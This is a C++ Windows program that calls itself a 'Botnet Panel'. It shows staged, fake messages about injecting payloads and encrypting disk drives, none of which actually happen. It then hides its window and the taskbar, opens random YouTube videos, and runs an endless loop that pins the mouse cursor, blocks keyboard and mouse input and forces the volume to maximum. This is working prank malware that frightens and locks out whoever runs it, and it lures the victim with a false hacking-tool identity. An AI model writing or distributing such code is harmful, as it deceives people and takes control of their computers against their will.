#include <iostream>
#include <Windows.h>    
#include <shellapi.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <random>
#include <urlmon.h> 
#include <tchar.h>
#pragma comment(lib, "urlmon.lib")

using namespace std;
HWND hWnd = NULL, hWnd2 = NULL, hWnd3 = NULL;

string getCurrentDir() {
    char buff[MAX_PATH];
    GetModuleFileNameA(NULL, buff, MAX_PATH);
    string::size_type position = string(buff).find_last_of("\\/");
    return string(buff).substr(0, position);
}

bool ChangeVolume(double nVolume, bool bScalar, BOOL setMute)
{

    HRESULT hr = NULL, hr2 = NULL;
    bool decibels = false;
    bool scalar = false;
    double newVolume = nVolume;

    CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    hr2 = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;

    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;

    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;

    float currentVolume = 0;
    BOOL IsMuted = TRUE;
    endpointVolume->GetMasterVolumeLevel(&currentVolume);




    hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);
    hr2 = endpointVolume->GetMute(&IsMuted);

    if (bScalar == false)
    {
        hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
    }
    else if (bScalar == true)
    {
        hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
    }

    if (setMute == TRUE)
    {
        hr2 = endpointVolume->SetMute(FALSE, NULL);
    }
    else if (setMute == FALSE)
    {
        hr2 = endpointVolume->SetMute(FALSE, NULL);
    }

    endpointVolume->Release();



    CoUninitialize();

    return FALSE;
}

int main()
{
    int i = 0;

    HANDLE  hConsole;
    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    int col = 12, col2 = 14, col3 = 15, col4 = 0, col5 = 4;

    HWND hwnd = ::GetConsoleWindow();
    if (hwnd != NULL)
    {
        HMENU hMenu = ::GetSystemMenu(hwnd, FALSE);
        if (hMenu != NULL) DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
        if (hMenu != NULL) DeleteMenu(hMenu, SC_MINIMIZE, MF_BYCOMMAND);
        if (hMenu != NULL) DeleteMenu(hMenu, SC_MAXIMIZE, MF_BYCOMMAND);
    }

    FlushConsoleInputBuffer(hConsole);
    SetConsoleTextAttribute(hConsole, col);
    SetConsoleTitleA("Welcome to Slethzy's Botnet Panel!");
    Sleep(750);
    cout << "   _____   _          _     _                          __  \n";
    cout << "  / ____| | |        | |   | |                      _  \\ \\ \n";
    cout << " | (___   | |   ___  | |_  | |__    ____  _   _    (_)  | |\n";
    cout << "  \\___ \\  | |  / _ \\ | __| | '_ \\  |_  / | | | |        | |\n";
    cout << "  ____) | | | |  __/ | |_  | | | |  / /  | |_| |    _   | |\n";
    cout << " |_____/  |_|  \\___|  \\__| |_| |_| /___|  \\__, |   (_)  | |\n";
    cout << "                                          __/ |        /_/ \n";
    cout << "                                         |___/            \n" << endl;
    SetConsoleTextAttribute(hConsole, col5);
    Sleep(750);
    cout << "  ____            _                    _   \n";
    cout << " |  _ \\          | |                  | |  \n";
    cout << " | |_) |   ___   | |_   _ __     ___  | |_ \n";
    cout << " |  _ <   / _ \\  | __| | '_ \\   / _ \\ | __|\n";
    cout << " | |_) | | (_) | | |_  | | | | |  __/ | |_ \n";
    cout << " |____/   \\___/   \\__| |_| |_|  \\___|  \\__|\n" << endl;
    Sleep(1000);
    SetConsoleTextAttribute(hConsole, col);
    cout << "  __  __               _            _____              _____                 \n";
    cout << " |  \\/  |             | |          |_   _|            / ____|    _       _   \n";
    cout << " | \\  / |   __ _    __| |   ___      | |    _ __     | |       _| |_   _| |_ \n";
    cout << " | |\\/| |  / _` |  / _` |  / _ \\     | |   | '_ \\    | |      |_   _| |_   _|\n";
    cout << " | |  | | | (_| | | (_| | |  __/    _| |_  | | | |   | |____    |_|     |_|\n";
    cout << " |_|  |_|  \\__,_|  \\__,_|  \\___|   |_____| |_| |_|    \\_____|                \n" << endl;
    Sleep(2000);
    system("cls");
    Sleep(2000);
    SetConsoleTextAttribute(hConsole, col3);
    SetConsoleTitleA("Accessing Windows Administration     13%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration     17%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration     21%");
    std::cout << "L";
    Sleep(75);
    cout << "o";
    SetConsoleTitleA("Accessing Windows Administration.    28%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration.    32%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration.    37%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration.    45%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration.    49%");
    Sleep(75);
    cout << "a";
    SetConsoleTitleA("Accessing Windows Administration..   55%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration..   62%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration..   74%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration..   81%");
    Sleep(75);
    cout << "d";
    SetConsoleTitleA("Accessing Windows Administration...   87%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration...   94%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration...   99%");
    Sleep(25);
    SetConsoleTitleA("Accessing Windows Administration...   100%");
    Sleep(75);
    SetConsoleTitleA("Injecting Payload");
    cout << "i";
    Sleep(75);
    cout << "n";
    Sleep(75);
    SetConsoleTitleA("Injecting Payload.");
    cout << "g";
    Sleep(75);
    cout << " ";
    Sleep(75);
    SetConsoleTitleA("Injecting Payload..");
    cout << "D";
    Sleep(75);
    cout << "a";
    Sleep(75);
    SetConsoleTitleA("Injecting Payload...");
    cout << "t";
    Sleep(75);
    SetConsoleTitleA("Success!");
    cout << "a";
    Sleep(75);
    cout << "b";
    Sleep(75);
    SetConsoleTitleA("Dumping Keys Into Registry");
    cout << "a";
    Sleep(75);
    cout << "s";
    SetConsoleTitleA("Dumping Keys Into Registry.");
    Sleep(75);
    cout << "e";
    SetConsoleTitleA("Dumping Keys Into Registry..");
    Sleep(75);
    SetConsoleTitleA("Dumping Keys Into Registry...");
    Sleep(175);
    cout << ".";
    SetConsoleTitleA("Dumping Keys Into Registry....");
    Sleep(175);
    cout << ".";
    SetConsoleTitleA("Dumping Keys Into Registry.....");
    Sleep(125);
    cout << ".\n" << endl;
    SetConsoleTitleA("Success!");
    system("cls");

    FlushConsoleInputBuffer(hConsole);
    SetConsoleTextAttribute(hConsole, col2);

    cout << "Aquiring Current User Directory: ";
    Sleep(1500);
    cout << getCurrentDir() << "\n" << endl;
    Sleep(1000);
    system("cls");
    SetConsoleTextAttribute(hConsole, col3);
    cout << "A";
    Sleep(125);
    SetConsoleTitleA("Decrypting");
    cout << "c";
    Sleep(125);
    SetConsoleTitleA("Decrypting Files");
    cout << "c";
    Sleep(125);
    cout << "e";
    SetConsoleTitleA("Decrypting Files.");
    Sleep(125);
    cout << "s";
    Sleep(125);
    cout << "s";
    SetConsoleTitleA("Decrypting Files..");
    Sleep(125);
    cout << "i";
    SetConsoleTitleA("Decrypting Files...");
    Sleep(125);
    cout << "n";
    SetConsoleTitleA("Decrypting Files....");
    Sleep(125);
    cout << "g";
    SetConsoleTitleA("Decrypting Files.....");
    Sleep(125);
    cout << " ";
    Sleep(125);
    SetConsoleTitleA("Success!");
    cout << "D";
    Sleep(125);
    SetConsoleTitleA("Encrypting");
    cout << "a";
    Sleep(125);
    SetConsoleTitleA("Encrypting Disk Drives");
    cout << "t";
    Sleep(125);
    cout << "a";
    SetConsoleTitleA("Encrypting Disk Drives.");
    Sleep(125);
    cout << "b";
    SetConsoleTitleA("Encrypting Disk Drives..");
    Sleep(125);
    cout << "a";
    SetConsoleTitleA("Encrypting Disk Drives...");
    Sleep(125);
    cout << "s";
    SetConsoleTitleA("Encrypting Disk Drives....");
    Sleep(125);
    cout << "e";
    SetConsoleTitleA("Encrypting Disk Drives.....");
    Sleep(175);
    cout << ".";
    SetConsoleTitleA("Encrypting Disk Drives......");
    Sleep(175);
    cout << ".";
    SetConsoleTitleA("Encrypting Disk Drives......");
    Sleep(175);
    cout << ".\n" << endl;
    SetConsoleTitleA("Success!");
    system("cls");

    Sleep(600);
    FlushConsoleInputBuffer(hConsole);
    SetConsoleTextAttribute(hConsole, col);
    SetConsoleTitleA("Bad Mistake :)");
    std::cout << "Someones in trouble lmao\n" << std::endl;
    Sleep(700);
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Sleep(1000);

    std::random_device dev;
    std::mt19937 rng(dev());
    std::uniform_int_distribution<std::mt19937::result_type> dist6(1, 5);
    ShellExecuteA(hWnd3, "open", "www.google.com", NULL, NULL, SW_FORCEMINIMIZE);
    CloseWindow(hWnd3);

    int ReadMoveValue = dist6(rng);
    cout << ReadMoveValue << endl;
    if (ReadMoveValue == 1)
    {
        ShellExecuteA(hWnd, "open", "www.youtube.com/watch?v=aQoPovrPiFU&ab_channel=GAYHIP-HOP", NULL, NULL, SW_FORCEMINIMIZE);
    }
    if (ReadMoveValue == 2)
    {
        ShellExecuteA(hWnd, "open", "www.youtube.com/watch?v=wTZpqGvOtUU&ab_channel=TakeightTakeight", NULL, NULL, SW_FORCEMINIMIZE);
    }
    if (ReadMoveValue == 3)
    {
        ShellExecuteA(hWnd, "open", "www.youtube.com/watch?v=rjFg1L82tjw&ab_channel=Whisper-FI", NULL, NULL, SW_FORCEMINIMIZE);
    }
    if (ReadMoveValue == 4)
    {
        ShellExecuteA(hWnd, "open", "www.youtube.com/watch?v=X1u93x1oGdE&ab_channel=DanielGottDanielGott", NULL, NULL, SW_FORCEMINIMIZE);
    }
    if (ReadMoveValue == 5)
    {
        ShellExecuteA(hWnd, "open", "www.youtube.com/watch?v=ysXLOgIq-gk&list=PLqYxeETdxNydb_V1pEqFh4SmrrTA4ds3l&index=8&ab_channel=Cextraker", NULL, NULL, SW_FORCEMINIMIZE);
    }
    ShowWindow(hWnd, SW_HIDE);
    
    HWND hTaskbar = FindWindow(L"Shell_TrayWnd", NULL);

    ShowWindow(hTaskbar, SW_HIDE);
    while (1)
    {
        int i = 0;
        i++;
        SetCursorPos(0, 0);
        BlockInput(TRUE);
        ChangeVolume(1.0, true, TRUE);

    }


}
